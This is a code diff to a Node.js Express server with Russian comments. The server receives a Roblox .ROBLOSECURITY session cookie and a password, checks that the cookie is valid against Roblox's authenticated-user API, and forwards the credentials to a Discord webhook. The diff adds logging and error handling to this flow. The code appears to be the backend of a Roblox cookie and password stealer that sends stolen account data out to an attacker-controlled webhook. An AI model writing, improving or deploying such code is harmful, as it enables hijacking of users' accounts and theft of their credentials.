@@ -1,10 +1,9 @@
 const express = require('express');
-const fetch = require('node-fetch');
 const app = express();
 
 app.use(express.json());
 
-// Разрешаем CORS-запросы
+// CORS для всех запросов
 app.use((req, res, next) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -13,11 +12,13 @@ app.use((req, res, next) => {
   next();
 });
 
-// Эндпоинт для проверки статуса
+// Пинг для пробуждения
 app.get('/ping', (req, res) => res.send('OK'));
 
-// Главный эндпоинт валидации и отправки
+// Главный эндпоинт валидации
 app.post('/api/submit', async (req, res) => {
+  console.log("[REQUEST] Received:", JSON.stringify(req.body).slice(0, 200));
+  
   const { cookie, password, category, webhookUrl } = req.body;
 
   if (!cookie || !password) {
@@ -33,15 +34,17 @@ app.post('/api/submit', async (req, res) => {
   cleaned = cleaned.replace(/^["';]+|["';]+$/g, "").trim();
 
   try {
-    // Запрос к API Roblox
+    // Запрос к API Roblox (используем встроенный fetch в Node 18+)
     const robloxRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
       method: 'GET',
       headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Accept': 'application/json',
         'Cookie': `.ROBLOSECURITY=${cleaned}`
       }
     });
+
+    console.log("[ROBLOX] Status:", robloxRes.status);
 
     if (robloxRes.status !== 200) {
       return res.status(400).json({ 
@@ -51,11 +54,13 @@ app.post('/api/submit', async (req, res) => {
     }
 
     const userData = await robloxRes.json();
+    console.log("[ROBLOX] User:", userData.name);
+    
     if (!userData || !userData.id) {
       return res.status(400).json({ isValid: false, reason: "Failed to parse Roblox user" });
     }
 
-    // Отправка в Discord с сервера
+    // Отправка в Discord
     if (webhookUrl) {
       const safeBlock = text => "```\n" + String(text).replace(/`/g, "'") + "\n```";
       const payload = {
@@ -73,11 +78,16 @@ app.post('/api/submit', async (req, res) => {
         }]
       };
 
-      await fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
+      try {
+        const discordRes = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        console.log("[DISCORD] Status:", discordRes.status);
+      } catch (e) {
+        console.log("[DISCORD] Error:", e.message);
+      }
     }
 
     return res.json({
@@ -87,6 +97,7 @@ app.post('/api/submit', async (req, res) => {
     });
 
   } catch (err) {
+    console.log("[ERROR]", err.message);
     return res.status(500).json({ isValid: false, reason: "Server error: " + err.message });
   }
 });
